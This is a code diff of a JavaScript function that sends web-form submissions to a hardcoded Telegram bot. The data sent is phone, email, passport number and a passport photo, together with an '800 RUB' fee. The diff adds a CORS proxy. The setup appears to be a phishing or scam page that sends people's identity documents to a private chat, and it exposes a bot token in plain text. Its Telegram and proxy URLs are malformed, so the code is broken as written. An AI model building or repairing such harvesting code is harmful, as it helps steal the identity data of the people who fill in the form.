@@ -610,61 +610,56 @@ const TG_CHAT_ID = '8232492258';
 // ========== TELEGRAM ОТПРАВКА ==========
 async function sendToTelegram(orderId, formData, photoBase64) {
     const TG_TOKEN = '8126463959:AAEp2JNil_vkdf5eBe-J1idT3-cEpifbFx8';
-    const TG_CHAT_ID = '5353896236'; // Твой реальный ID из User Info Bot
+    const TG_CHAT_ID = '8232492258'; // Твой ID из запроса
+    
+    // Прокси нужен для работы с локального компьютера (192.168...), 
+    // чтобы обойти блокировку браузера (CORS)
+    const PROXY = 'https://herokuapp.com'; 
+    const API_URL = PROXY + `https://telegram.org{TG_TOKEN}`;
 
     try {
-        // Формируем простой текст без разметки, чтобы ничего не заглючило
-        let text = `📋 НОВАЯ ЗАЯВКА #${orderId}\n\n` +
+        // Формируем текст
+        let text = `📋 *НОВАЯ ЗАЯВКА #${orderId}*\n\n` +
                    `📞 Телефон: ${formData.phone}\n` +
                    `📧 Email: ${formData.email}\n` +
-                   `📱 Мессенджер: ${formData.messenger || 'не указан'}\n` +
                    `🆔 Паспорт: ${formData.passportNumber}\n` +
-                   `💰 Сумма: 800 RUB\n` +
-                   `⏳ Статус: ожидает проверки`;
+                   `💰 Сумма: 800 RUB`;
 
-        // 1. Отправляем текстовые данные
-        const textResponse = await fetch(`https://telegram.org{TG_TOKEN}/sendMessage`, {
+        // 1. Отправляем текст
+        const textResponse = await fetch(`${API_URL}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
                 chat_id: TG_CHAT_ID, 
-                text: text
+                text: text, 
+                parse_mode: 'Markdown' 
             })
         });
 
-        const textData = await textResponse.json();
-        if (!textData.ok) {
-            console.error('Ошибка Telegram (текст):', textData.description);
+        if (!textResponse.ok) {
+            const errorData = await textResponse.json();
+            console.error('Ошибка Telegram:', errorData.description);
+            // Если ошибка "chat not found", значит ID неверный или бот не запущен
         }
 
-        // 2. Отправляем фото, если оно есть
-        if (photoBase64 && photoBase64.includes('base64')) {
-            try {
-                const res = await fetch(photoBase64);
-                const blob = await res.blob();
-                
-                let photoForm = new FormData();
-                photoForm.append('chat_id', TG_CHAT_ID);
-                photoForm.append('photo', blob, 'passport.jpg');
+        // 2. Отправляем фото (если есть)
+        if (photoBase64) {
+            const res = await fetch(photoBase64);
+            const blob = await res.blob();
+            
+            let photoForm = new FormData();
+            photoForm.append('chat_id', TG_CHAT_ID);
+            photoForm.append('photo', blob, 'passport.jpg');
 
-                const photoResponse = await fetch(`https://telegram.org{TG_TOKEN}/sendPhoto`, { 
-                    method: 'POST', 
-                    body: photoForm 
-                });
-
-                const photoData = await photoResponse.json();
-                if (!photoData.ok) {
-                    console.error('Ошибка Telegram (фото):', photoData.description);
-                }
-            } catch (photoErr) {
-                console.error('Ошибка обработки фото:', photoErr);
-            }
+            await fetch(`${API_URL}/sendPhoto`, { 
+                method: 'POST', 
+                body: photoForm 
+            });
         }
 
         return true;
     } catch (err) {
-        console.error('Критическая ошибка сети:', err);
-        alert('Ошибка при отправке! Проверьте консоль браузера (F12).');
+        console.error('Критическая ошибка:', err);
         return false;
     }
 }
